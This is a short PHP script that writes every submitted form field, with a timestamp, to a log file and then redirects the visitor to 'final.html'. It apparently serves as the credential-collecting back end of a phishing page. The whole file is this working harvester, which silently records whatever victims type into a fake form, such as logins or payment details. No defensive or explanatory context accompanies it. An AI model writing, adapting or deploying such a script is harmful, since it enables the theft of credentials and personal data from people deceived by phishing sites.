<?php

header('Location: final.html');
date_default_timezone_set("Asia/Dhaka");
$dash = "____________________________________________________";
$date_time = date("Y-m-d") . "  " . date("h:i:sa")."\r\n".$dash."\r\n";
$handle = fopen("log_data.txt", "a");
fwrite($handle, "\r\n");
fwrite($handle, $date_time);

foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, '=');
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>